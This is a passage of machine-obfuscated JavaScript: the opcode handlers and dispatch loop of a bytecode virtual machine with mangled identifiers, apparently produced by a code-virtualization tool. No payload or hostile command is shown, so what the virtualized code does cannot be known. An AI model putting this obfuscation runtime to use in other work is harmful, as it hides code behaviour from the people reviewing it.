iI[ie]=iV;K[t++]=iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];if(iI===null||iI===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(iV)+'\x27\x20of\x20'+iI);K[t++]=iI[iV],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[--t];if(ie===null||ie===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(iI)+'\x27\x20of\x20'+ie);if(il){if(!Reflect['set'](ie,iI,iV))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(iI)+'\x27\x20of\x20object');}else ie[iI]=iV;K[t++]=iV,i0++;}},function(iL){d7:{let iV,iI;iL!=null?(iI=K[--t],iV=i1[iL]):(iV=K[--t],iI=K[--t]);let ie=delete iI[iV];if(il&&!ie)throw new TypeError('Cannot\x20delete\x20property\x20\x27'+String(iV)+'\x27\x20of\x20object');K[t++]=ie,i0++;}},function(iL){d7:{let iV=i1[iL],iI;if(vmJ_a0ee8c['_$SZo6qA']&&iV in vmJ_a0ee8c['_$SZo6qA'])throw new ReferenceError('Cannot\x20access\x20\x27'+iV+'\x27\x20before\x20initialization');if(iV in vmJ_a0ee8c)iI=vmJ_a0ee8c[iV];else{if(iV in vmk)iI=vmk[iV];else throw new ReferenceError(iV+'\x20is\x20not\x20defined');}K[t++]=iI,i0++;}},function(iL){d7:{let iV=K[--t],iI=i1[iL];if(vmJ_a0ee8c['_$SZo6qA']&&iI in vmJ_a0ee8c['_$SZo6qA'])throw new ReferenceError('Cannot\x20access\x20\x27'+iI+'\x27\x20before\x20initialization');let ie=!(iI in vmJ_a0ee8c)&&!(iI in vmk);vmJ_a0ee8c[iI]=iV,iI in vmk&&(vmk[iI]=iV),ie&&(vmk[iI]=iV),K[t++]=iV,i0++;}},function(iL){d7:{K[t++]={},i0++;}},function(iL){d7:{let iV=K[--t],iI=i1[iL];iV===null||iV===undefined?K[t++]=undefined:K[t++]=iV[iI],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI in iV,i0++;}},,function(iL){d7:{let iV=K[--t],iI=K[t-0x1];iV!==null&&iV!==undefined&&Object['assign'](iI,iV),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];iI===null||iI===undefined?K[t++]=undefined:K[t++]=iI[iV],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=i1[iL];vmQ(iI,ie,{'value':iV,'writable':!![],'enumerable':!![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[--t];vmQ(ie,iI,{'value':iV,'writable':!![],'enumerable':!![],'configurable':!![]}),i0++;}},,,,,,function(iL){d7:{K[t++]=[],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1];iI['push'](iV),i0++;}},,function(iL){d7:{let iV=K[--t],iI={'value':iV};b['add'](iI),K[t++]=iI,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1];if(Array['isArray'](iV))Array['prototype']['push']['apply'](iI,iV);else for(let ie of iV){iI['push'](ie);}i0++;}},function(iL){d7:{let iV=K[t-0x1];iV['length']++,i0++;}},,,,,function(iL){d7:{let iV=K[--t],iI=d(iV),ie=iI&&iI['a'],iH=iI&&iI['s'],iZ=iI&&iI['g'],iA=iI&&iI['m'],iD=iI&&iI['p']||0x0,iK=iI&&iI['st'],it=ie?iP:undefined,iq=iF,d0;if(iZ)d0=B(L,o,iV,iq,Q,iK,vmk,w);else{if(iH){if(ie)d0=j(f,iV,iq,it);else iA?d0=U(f,o,iV,iq,iK,vmk,w):d0=P(f,o,iV,iq,iK,vmk,w);}else{if(ie)d0=F(m,iV,iq,it);else iA?d0=y(m,o,iV,iq,iK,vmk,w):d0=C(m,o,iV,iq,iK,vmk,w);}}c(d0,'length',{'value':iD,'writable':![],'enumerable':![],'configurable':!![]}),K[t++]=d0,i0++;}},,,,function(iL){d7:{let iV=K[--t],iI=X(iQ,iV),ie=K[--t];if(typeof ie!=='function')throw new TypeError(ie+'\x20is\x20not\x20a\x20constructor');if(Q['has'](ie))throw new TypeError(ie['name']+'\x20is\x20not\x20a\x20constructor');let iH=vmJ_a0ee8c['_$eT2ZGH'];vmJ_a0ee8c['_$eT2ZGH']=undefined;let iZ;try{iZ=Reflect['construct'](ie,iI);}finally{vmJ_a0ee8c['_$eT2ZGH']=iH;}K[t++]=iZ,i0++;}},function(iL){d7:{let iV=K[--t],iI=X(iQ,iV),ie=K[--t];if(iL===0x1){K[t++]=iI,i0++;break d7;}if(vmJ_a0ee8c['_$54tFhZ']){i0++;break d7;}let iH=vmJ_a0ee8c['_$tAOTDF'];if(iH){let iZ=iH['parent'],iA=iH['newTarget'],iD=Reflect['construct'](iZ,iI,iA);D&&D!==iD&&vmz(D)['forEach'](function(iK){!(iK in iD)&&(iD[iK]=D[iK]);});D=iD,iC=!![];is&&(R(iF,'__this__'),iF['_$xk0pxV']['__this__']=D);i0++;break d7;}if(typeof ie!=='function')throw new TypeError('Super\x20expression\x20must\x20be\x20a\x20constructor');vmJ_a0ee8c['_$tFZE09']=A;try{let iK=ie['apply'](D,iI);iK!==undefined&&iK!==D&&typeof iK==='object'&&(D&&Object['assign'](iK,D),D=iK),iC=!![],is&&(R(iF,'__this__'),iF['_$xk0pxV']['__this__']=D);}catch(it){if(it instanceof TypeError&&(it['message']['includes']('\x27new\x27')||it['message']['includes']('constructor'))){let iq=Reflect['construct'](ie,iI,A);iq!==D&&D&&Object['assign'](iq,D),D=iq,iC=!![],is&&(R(iF,'__this__'),iF['_$xk0pxV']['__this__']=D);}else throw it;}finally{delete vmJ_a0ee8c['_$tFZE09'];}i0++;}},function(iL){d7:{let iV=K[--t];K[t++]=import(iV),i0++;}},,,,function(iL){d7:{K[t-0x1]=typeof K[t-0x1],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI instanceof iV,i0++;}},function(iL){d7:{let iV=i1[iL];iV in vmJ_a0ee8c?K[t++]=typeof vmJ_a0ee8c[iV]:K[t++]=typeof vmk[iV],i0++;}},,,,,,,,,,,function(iL){d7:{let iV=K[--t],iI=iV['next']();K[t++]=iI,i0++;}},function(iL){d7:{let iV=K[--t];iV&&typeof iV['return']==='function'&&iV['return'](),i0++;}},,,function(iL){d7:{let iV=K[--t];if(iV==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+iV);let iI=iV[Symbol['iterator']];if(typeof iI!=='function')throw new TypeError('Object\x20is\x20not\x20iterable');K[t++]=iI['call'](iV),i0++;}},function(iL){d7:{let iV=K[--t];K[t++]=!!iV['done'],i0++;}},function(iL){d7:{let iV=K[--t];if(iV==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+iV);let iI=iV[Symbol['asyncIterator']];if(typeof iI==='function')K[t++]=iI['call'](iV);else{let ie=iV[Symbol['iterator']];if(typeof ie!=='function')throw new TypeError('Object\x20is\x20not\x20async\x20iterable');K[t++]=ie['call'](iV);}i0++;}},function(iL){d7:{let iV=K[--t],iI=iV['next']();K[t++]=Promise['resolve'](iI),i0++;}},function(iL){d7:{let iV=K[--t];iV&&typeof iV['return']==='function'?K[t++]=Promise['resolve'](iV['return']()):K[t++]=Promise['resolve'](),i0++;}},function(iL){d7:{let iV=K[--t];K[t++]=z(iV),i0++;}},,,,,,,,function(iL){d7:{let iV=K[--t],iI=K[--t],ie=iL,iH=function(iZ,iA){let iD=function(){if(iZ){iA&&(vmJ_a0ee8c['_$upMhyP']=iD);let iK='_$tFZE09'in vmJ_a0ee8c;!iK&&(vmJ_a0ee8c['_$tFZE09']=new.target);try{let it=iZ['apply'](this,o(arguments));if(iA&&it!==undefined&&(typeof it!=='object'||it===null))throw new TypeError('Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined');return it;}finally{iA&&delete vmJ_a0ee8c['_$upMhyP'],!iK&&delete vmJ_a0ee8c['_$tFZE09'];}}};return iD;}(iI,ie);iV&&vmQ(iH,'name',{'value':iV,'configurable':!![]}),K[t++]=iH,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1];if(iV===null){vmM(iI['prototype'],null),vmM(iI,Function['prototype']),iI['_$QZL7TU']=null,i0++;break d7;}let ie=![];try{let iH=vmc(iV['prototype']),iZ=iV['apply'](iH,[]);iZ!==undefined&&iZ!==iH&&(ie=!![]);}catch(iA){iA instanceof TypeError&&(iA['message']['includes']('\x27new\x27')||iA['message']['includes']('constructor')||iA['message']['includes']('Illegal\x20constructor'))&&(ie=!![]);}if(ie){let iD=iI,iK=vmJ_a0ee8c,it='_$tFZE09',iq='_$upMhyP',d0='_$tAOTDF';function d1(...d2){let d3=vmc(iV['prototype']);iK[d0]={'parent':iV,'newTarget':new.target||d1},iK[iq]=new.target||d1;let d4=it in iK;!d4&&(iK[it]=new.target);try{let d5=iD['apply'](d3,d2);d5!==undefined&&typeof d5==='object'&&(d3=d5);}finally{delete iK[d0],delete iK[iq],!d4&&delete iK[it];}return d3;}d1['prototype']=vmc(iV['prototype']),d1['prototype']['constructor']=d1,vmM(d1,iV),vmz(iD)['forEach'](function(d2){d2!=='prototype'&&d2!=='length'&&d2!=='name'&&c(d1,d2,vmX(iD,d2));});iD['prototype']&&(vmz(iD['prototype'])['forEach'](function(d2){d2!=='constructor'&&c(d1['prototype'],d2,vmX(iD['prototype'],d2));}),vmo(iD['prototype'])['forEach'](function(d2){c(d1['prototype'],d2,vmX(iD['prototype'],d2));}));K[--t],K[t++]=d1,d1['_$QZL7TU']=iV,i0++;break d7;}vmM(iI['prototype'],iV['prototype']),vmM(iI,iV),iI['_$QZL7TU']=iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=vmJ_a0ee8c['_$eT2ZGH'],iH=ie?vmh(ie):h(iI),iZ=G(iH,iV);if(iZ['desc']&&iZ['desc']['get']){let iD=iZ['desc']['get']['call'](iI);K[t++]=iD,i0++;break d7;}if(iZ['desc']&&iZ['desc']['set']&&!('value'in iZ['desc'])){K[t++]=undefined,i0++;break d7;}let iA=iZ['proto']?iZ['proto'][iV]:iH[iV];if(typeof iA==='function'){let iK=iZ['proto']||iH,it=iA['bind'](iI),iq=iA['constructor']&&iA['constructor']['name'],d0=iq==='GeneratorFunction'||iq==='AsyncFunction'||iq==='AsyncGeneratorFunction';!d0&&(!vmJ_a0ee8c['_$FWZbSq']&&(vmJ_a0ee8c['_$FWZbSq']=new WeakMap()),vmJ_a0ee8c['_$FWZbSq']['set'](it,iK)),K[t++]=it;}else K[t++]=iA;i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[--t],iH=h(ie),iZ=G(iH,iI);iZ['desc']&&iZ['desc']['set']?iZ['desc']['set']['call'](ie,iV):ie[iI]=iV,K[t++]=iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1],ie=i1[iL];vmQ(iI['prototype'],ie,{'value':iV,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1],ie=i1[iL],iH=M(iI);vmQ(iH,ie,{'get':iV,'enumerable':iH===iI,'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1],ie=i1[iL],iH=M(iI);vmQ(iH,ie,{'set':iV,'enumerable':iH===iI,'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1],ie=i1[iL];vmQ(iI,ie,{'value':iV,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1],ie=i1[iL];vmQ(iI,ie,{'get':iV,'enumerable':![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[t-0x1],ie=i1[iL];vmQ(iI,ie,{'set':iV,'enumerable':![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=i1[iL],ie=S(),iH='get_'+iI,iZ=ie['get'](iH);if(iZ&&iZ['has'](iV)){let it=iZ['get'](iV);K[t++]=it['call'](iV),i0++;break d7;}let iA='_$0KTMKI'+'get_'+iI['substring'](0x1)+'_$LXBHEb';if(iV['constructor']&&iA in iV['constructor']){let iq=iV['constructor'][iA];K[t++]=iq['call'](iV),i0++;break d7;}let iD=ie['get'](iI);if(iD&&iD['has'](iV)){K[t++]=iD['get'](iV),i0++;break d7;}let iK=r(iI);if(iK in iV){K[t++]=iV[iK],i0++;break d7;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+iI+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=i1[iL],iH=S(),iZ='set_'+ie,iA=iH['get'](iZ);if(iA&&iA['has'](iI)){let iq=iA['get'](iI);iq['call'](iI,iV),K[t++]=iV,i0++;break d7;}let iD='_$0KTMKI'+'set_'+ie['substring'](0x1)+'_$LXBHEb';if(iI['constructor']&&iD in iI['constructor']){let d0=iI['constructor'][iD];d0['call'](iI,iV),K[t++]=iV,i0++;break d7;}let iK=iH['get'](ie);if(iK&&iK['has'](iI)){iK['set'](iI,iV),K[t++]=iV,i0++;break d7;}let it=r(ie);if(it in iI){iI[it]=iV,K[t++]=iV,i0++;break d7;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+ie+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=i1[iL],iH=S();!iH['has'](ie)&&iH['set'](ie,new WeakMap());let iZ=iH['get'](ie);if(iZ['has'](iI))throw new TypeError('Cannot\x20initialize\x20'+ie+'\x20twice\x20on\x20the\x20same\x20object');iZ['set'](iI,iV),i0++;}},function(iL){d7:{let iV=K[--t],iI=i1[iL],ie=![],iH=l();if(iH){let iZ=iH['get'](iI);iZ&&iZ['has'](iV)&&(ie=!![]);}K[t++]=ie,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=i1[iL],iH=null,iZ=l();if(iZ){let iK=iZ['get'](ie);iK&&iK['has'](iI)&&(iH=iK['get'](iI));}if(iH===null){let it=s(ie);it in iI&&(iH=iI[it]);}if(iH===null)throw new TypeError('Cannot\x20read\x20private\x20member\x20'+ie+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');if(typeof iH!=='function')throw new TypeError(ie+'\x20is\x20not\x20a\x20function');let iA=X(iQ,iV),iD=iH['apply'](iI,iA);K[t++]=iD,i0++;}},function(iL){d7:{let iV=K[--t],iI=i1[iL];if(iV==null){K[t++]=undefined,i0++;break d7;}let ie=S(),iH=ie['get'](iI);if(!iH||!iH['has'](iV))throw new TypeError('Cannot\x20read\x20private\x20member\x20'+iI+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');K[t++]=iH['get'](iV),i0++;}},function(iL){d7:{let iV=K[--t];K[--t];let iI=K[t-0x1],ie=i1[iL],iH=S();!iH['has'](ie)&&iH['set'](ie,new WeakMap());let iZ=iH['get'](ie);iZ['set'](iI,iV),i0++;}},function(iL){d7:{let iV=K[--t],iI=i1[iL],ie=l();if(ie){let iA='get_'+iI,iD=ie['get'](iA);if(iD&&iD['has'](iV)){let it=iD['get'](iV);K[t++]=it['call'](iV),i0++;break d7;}let iK=ie['get'](iI);if(iK&&iK['has'](iV)){K[t++]=iK['get'](iV),i0++;break d7;}}let iH='_$0KTMKI'+'get_'+iI['substring'](0x1)+'_$LXBHEb';if(iH in iV){let iq=iV[iH];K[t++]=iq['call'](iV),i0++;break d7;}let iZ=r(iI);if(iZ in iV){K[t++]=iV[iZ],i0++;break d7;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+iI+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=i1[iL],iH=l();if(iH){let iD='set_'+ie,iK=iH['get'](iD);if(iK&&iK['has'](iI)){let iq=iK['get'](iI);iq['call'](iI,iV),K[t++]=iV,i0++;break d7;}let it=iH['get'](ie);if(it&&it['has'](iI)){it['set'](iI,iV),K[t++]=iV,i0++;break d7;}}let iZ='_$0KTMKI'+'set_'+ie['substring'](0x1)+'_$LXBHEb';if(iZ in iI){let d0=iI[iZ];d0['call'](iI,iV),K[t++]=iV,i0++;break d7;}let iA=r(ie);if(iA in iI){iI[iA]=iV,K[t++]=iV,i0++;break d7;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+ie+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},,function(iL){d7:{if(ir&&!iC)throw new ReferenceError('Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor');K[t++]=D,i0++;}},function(iL){d7:{if(iR===null){if(il||!ix){iR=[];let iV=iB||I;if(iV)for(let iI=0x0;iI<iV['length'];iI++){iR[iI]=iV[iI];}if(il){let ie=function(){throw new TypeError('\x27caller\x27,\x20\x27callee\x27,\x20and\x20\x27arguments\x27\x20properties\x20may\x20not\x20be\x20accessed\x20on\x20strict\x20mode\x20functions\x20or\x20the\x20arguments\x20objects\x20for\x20calls\x20to\x20them');};vmQ(iR,'callee',{'get':ie,'set':ie,'enumerable':![],'configurable':![]});}else vmQ(iR,'callee',{'value':Z,'writable':!![],'enumerable':![],'configurable':!![]});}else{let iH=I?I['length']:0x0,iZ={},iA=function(iq){return typeof iq==='string'?parseInt(iq,0xa):NaN;},iD=function(iq){return!isNaN(iq)&&iq>=0x0;},iK=function(iq){return iq<I['length']?I[iq]:iZ[iq];},it=function(iq){return iq<I['length']?iq in I:iq in iZ;};iR=new Proxy([],{'get':function(iq,d0,d1){if(d0==='length')return iH;if(d0==='callee')return Z;if(d0===Symbol['iterator'])return function(){let d4=0x0;return{'next':function(){if(d4<iH)return{'value':iK(d4++),'done':![]};return{'done':!![]};}};};let d2=iA(d0);if(iD(d2))return iK(d2);if(d0==='hasOwnProperty')return function(d4){if(d4==='length'||d4==='callee')return!![];let d5=iA(d4);return iD(d5)&&d5<iH&&it(d5);};let d3=Array['prototype'][d0];if(typeof d3==='function')return function(){let d4=[];for(let d5=0x0;d5<iH;d5++){d4[d5]=iK(d5);}return d3['apply'](d4,arguments);};return undefined;},'set':function(iq,d0,d1){if(d0==='length')return iH=d1,!![];let d2=iA(d0);if(iD(d2))return d2<I['length']?I[d2]=d1:iZ[d2]=d1,d2>=iH&&(iH=d2+0x1),!![];return!![];},'has':function(iq,d0){if(d0==='length'||d0==='callee')return!![];let d1=iA(d0);if(iD(d1)&&d1<iH)return it(d1);return d0 in Array['prototype'];},'deleteProperty':function(iq,d0){let d1=iA(d0);return iD(d1)&&(d1<I['length']?delete I[d1]:delete iZ[d1]),!![];},'getOwnPropertyDescriptor':function(iq,d0){if(d0==='callee')return{'value':Z,'writable':!![],'enumerable':![],'configurable':!![]};if(d0==='length')return{'value':iH,'writable':!![],'enumerable':![],'configurable':!![]};let d1=iA(d0);if(iD(d1)&&d1<iH&&it(d1))return{'value':iK(d1),'writable':!![],'enumerable':!![],'configurable':!![]};return undefined;},'ownKeys':function(iq){let d0=[];for(let d1=0x0;d1<iH;d1++){it(d1)&&d0['push'](String(d1));}return d0['push']('length','callee'),d0;}});}}K[t++]=iR,i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>0x10,ie=i1[iV],iH=i1[iI];K[t++]=new RegExp(ie,iH),i0++;}},function(iL){d7:{K[--t],K[t++]=undefined,i0++;}},function(iL){d7:{K[t++]=A,i0++;}},function(iL){d7:{K[t++]=vma[iL],i0++;}},function(iL){d7:{K[t++]=vmb[iL],i0++;}},function(iL){d7:{if(iL===-0x1)K[t++]=Symbol();else{let iV=K[--t];K[t++]=Symbol(iV);}i0++;}},function(iL){d7:{let iV=i1[iL];K[t++]=Symbol['for'](iV),i0++;}},function(iL){d7:{let iV=K[--t];K[t++]=Symbol['keyFor'](iV),i0++;}},,,,,,,,,,,function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[t-0x1];vmQ(ie['prototype'],iI,{'value':iV,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[t-0x1];vmQ(ie,iI,{'value':iV,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[t-0x1],iH=M(ie);vmQ(iH,iI,{'get':iV,'enumerable':iH===ie,'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[t-0x1],iH=M(ie);vmQ(iH,iI,{'set':iV,'enumerable':iH===ie,'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[t-0x1];vmQ(ie,iI,{'get':iV,'enumerable':![],'configurable':!![]}),i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[t-0x1];vmQ(ie,iI,{'set':iV,'enumerable':![],'configurable':!![]}),i0++;}},,,,,,,,,,,,,,,function(iL){d7:{debugger;i0++;}},function(iL){d7:{i0++;}},function(iL){d7:{iO=!![],iS=t>0x0?K[--t]:undefined;return;}},,,,,,,,function(iL){d7:{let iV=K[--t],iI={['_$xk0pxV']:vmc(null),['_$iShk8n']:vmc(null),['_$B27Lwo']:vmc(null),['_$bXCHhp']:iV};iF=iI,i0++;}},function(iL){d7:{let iV=i1[iL];if(iV==='__this__'){let iD=iF;while(iD){if(iD['_$B27Lwo']&&'__this__'in iD['_$B27Lwo'])throw new ReferenceError('Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization');if(iD['_$xk0pxV']&&'__this__'in iD['_$xk0pxV'])break;iD=iD['_$bXCHhp'];}K[t++]=D,i0++;break d7;}let iI=iF,ie,iH=![],iZ=iV['indexOf']('$$'),iA=iZ!==-0x1?iV['substring'](0x0,iZ):null;while(iI){let iK=iI['_$B27Lwo'],it=iI['_$xk0pxV'];if(iK&&iV in iK)throw new ReferenceError('Cannot\x20access\x20\x27'+iV+'\x27\x20before\x20initialization');if(iA&&iK&&iA in iK){if(!(it&&iV in it))throw new ReferenceError('Cannot\x20access\x20\x27'+iA+'\x27\x20before\x20initialization');}if(it&&iV in it){ie=it[iV],iH=!![];break;}iI=iI['_$bXCHhp'];}!iH&&(iV in vmJ_a0ee8c?ie=vmJ_a0ee8c[iV]:ie=vmk[iV]),K[t++]=ie,i0++;}},function(iL){d7:{let iV=i1[iL],iI=K[--t],ie=iF,iH=![];while(ie){let iZ=ie['_$B27Lwo'],iA=ie['_$xk0pxV'];if(iZ&&iV in iZ)throw new ReferenceError('Cannot\x20access\x20\x27'+iV+'\x27\x20before\x20initialization');if(iA&&iV in iA){if(ie['_$MnyFC1']&&iV in ie['_$MnyFC1']){if(il)throw new TypeError('Assignment\x20to\x20constant\x20variable.');iH=!![];break;}if(ie['_$iShk8n']&&iV in ie['_$iShk8n'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');iA[iV]=iI,iH=!![];break;}ie=ie['_$bXCHhp'];}if(!iH){if(iV in vmJ_a0ee8c)vmJ_a0ee8c[iV]=iI;else iV in vmk?vmk[iV]=iI:vmk[iV]=iI;}i0++;}},function(iL){d7:{K[t++]=iF,i0++;}},function(iL){d7:{iF&&iF['_$bXCHhp']&&(iF=iF['_$bXCHhp']),i0++;}},function(iL){d7:{let iV=i1[iL],iI=K[--t];R(iF,iV),iF['_$xk0pxV'][iV]=iI,i0++;}},function(iL){d7:{let iV=i1[iL],iI=K[--t],ie=iF,iH=![];while(ie){if(ie['_$xk0pxV']&&iV in ie['_$xk0pxV']){if(ie['_$iShk8n']&&iV in ie['_$iShk8n'])break;ie['_$xk0pxV'][iV]=iI;!ie['_$iShk8n']&&(ie['_$iShk8n']={});ie['_$iShk8n'][iV]=!![],iH=!![];break;}ie=ie['_$bXCHhp'];}!iH&&(N(iF,iV),iF['_$xk0pxV'][iV]=iI,!iF['_$iShk8n']&&(iF['_$iShk8n']={}),iF['_$iShk8n'][iV]=!![]),i0++;}},function(iL){d7:{let iV=i1[iL],iI=K[--t];R(iF,iV),iF['_$xk0pxV'][iV]=iI,!iF['_$iShk8n']&&(iF['_$iShk8n']={}),iF['_$iShk8n'][iV]=!![],i0++;}},function(iL){d7:{let iV=i1[iL];!iF['_$B27Lwo']&&(iF['_$B27Lwo']={}),iF['_$B27Lwo'][iV]=!![],i0++;}},function(iL){d7:{let iV=i1[iL],iI=K[--t],ie=iF['_$bXCHhp'];ie&&(ie['_$xk0pxV'][iV]=iI),i0++;}},function(iL){d7:{let iV=K[--t],iI=i1[iL];if(il&&!(iI in vmk)&&!(iI in vmJ_a0ee8c))throw new ReferenceError(iI+'\x20is\x20not\x20defined');vmJ_a0ee8c[iI]=iV,vmk[iI]=iV,K[t++]=iV,i0++;}},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,function(iL){d7:{q[iL]=q[iL]+0x1,i0++;}},function(iL){d7:{q[iL]=q[iL]-0x1,i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>>0x10;K[t++]=q[iV]+i1[iI],i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>>0x10;K[t++]=q[iV]-i1[iI],i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>>0x10;K[t++]=q[iV]*i1[iI],i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>>0x10,ie=q[iV],iH=i1[iI];K[t++]=ie[iH],i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>>0x10;K[t++]=q[iV]<i1[iI],i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>>0x10;q[iV]<i1[iI]?i0=iM(i3[i0]):i0++;}},function(iL){d7:{let iV=iL&0xffff,iI=iL>>>0x10,ie=K[--t],iH=X(iQ,ie),iZ=q[iV],iA=i1[iI],iD=iZ[iA];K[t++]=iD['apply'](iZ,iH),i0++;}},function(iL){d7:{q[iL]=K[--t],i0++;}},function(iL){d7:{let iV=q[iL]+0x1;q[iL]=iV,K[t++]=iV,i0++;}},function(iL){d7:{let iV=q[iL]-0x1;q[iL]=iV,K[t++]=iV,i0++;}}];switch(iW){case 0x0:{K[t++]=i1[im],i0++;continue;}case 0x1:{K[t++]=undefined,i0++;continue;}case 0x3:{K[--t],i0++;continue;}case 0x4:{let iL=K[t-0x1];K[t++]=iL,i0++;continue;}case 0x6:{K[t++]=q[im],i0++;continue;}case 0x7:{q[im]=K[--t],i0++;continue;}case 0x8:{K[t++]=I[im],i0++;continue;}case 0xa:{let iV=K[--t],iI=K[--t];K[t++]=iI+iV,i0++;continue;}case 0xb:{let ie=K[--t],iH=K[--t];K[t++]=iH-ie,i0++;continue;}case 0x10:{let iZ=K[--t];K[t++]=typeof iZ===k?iZ+0x1n:+iZ+0x1,i0++;continue;}case 0x1c:{let iA=K[--t];K[t++]=typeof iA===k?iA:+iA,i0++;continue;}case 0x2c:{let iD=K[--t],iK=K[--t];K[t++]=iK<iD,i0++;continue;}case 0x2e:{let it=K[--t],iq=K[--t];K[t++]=iq>it,i0++;continue;}case 0x32:{i0=iM(i3[i0]);continue;}case 0x34:{!K[--t]?i0=iM(i3[i0]):i0++;continue;}case 0x48:{let d0=K[--t],d1=K[--t];if(d1===null||d1===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(d0)+'\x27\x20of\x20'+d1);K[t++]=d1[d0],i0++;continue;}case 0x49:{let d2=K[--t],d3=K[--t],d4=K[--t];if(d4===null||d4===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(d3)+'\x27\x20of\x20'+d4);if(iu){if(!Reflect['set'](d4,d3,d2))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(d3)+'\x27\x20of\x20object');}else d4[d3]=d2;K[t++]=d2,i0++;continue;}}il=iu,ix=iw,ir=ip,is=iE,iC=iN,iP=iY,iB=iG,iF=ih,ij[iW](im),ih=iF,iN=iC;if(iO)return iO=![],iS;}break;}catch(d5){if(i6['length']>0x0){let d6=i6[i6['length']-0x1];t=d6['_$czTq5L'];if(d6['_$8iJwHv']!==undefined)ib(d5),i0=d6['_$8iJwHv'],d6['_$8iJwHv']=undefined,d6['_$At0dut']===undefined&&i6['pop']();else d6['_$At0dut']!==undefined?(i0=d6['_$At0dut'],d6['_$pdsKoy']=d5):(i0=d6['_$zj9zHS'],i6['pop']());continue;}throw d5;}}return t>0x0?iQ():iN?D:undefined;}function*W(V,I,H,Z,A,D){let K=[],t=0x0,q=new Array((V['p']||0x0)+(V['l']||0x0)),i0=0x0,i1=V['c'],i2=V['i'],i3=V['j']||a,i4=V['x']||a,i5=i2['length']>>0x1,i6=[],i7=null,i8={['_$01ziIx']:![],['_$BtMLgv']:undefined},i9={['_$6MmH4c']:![],['_$5TjbWq']:0x0},ii={['_$Or4AH1']:![],['_$TTuHhF']:0x0},id=V['o']||u,iu=!!V['st'],iw=!!V['sp'],ip=!!V['dc'],iE=!!V['nte'],iY=D,ig=!!V['a'];!iu&&!ig&&(D===undefined||D===null)&&(D=vmk);var iJ=0x0,iv=null,ik=null;let ia=V['seKey'],ib,iQ,ic,iX,iz,io;if(ia!==undefined){let iy=iU=>typeof iU==='number'&&Number['isFinite'](iU)&&Number['isInteger'](iU)&&iU>=-0x80000000&&iU<=0x7fffffff&&!Object['is'](iU,-0x0)?iU^ia|0x0:iU;ib=iU=>{K[t++]=iy(iU);},iQ=()=>iy(K[--t]),ic=()=>iy(K[t-0x1]),iX=iU=>{K[t-0x1]=iy(iU);},iz=iU=>iy(K[t-iU]),io=(iU,iT)=>{K[t-iU]=iy(iT);};}else 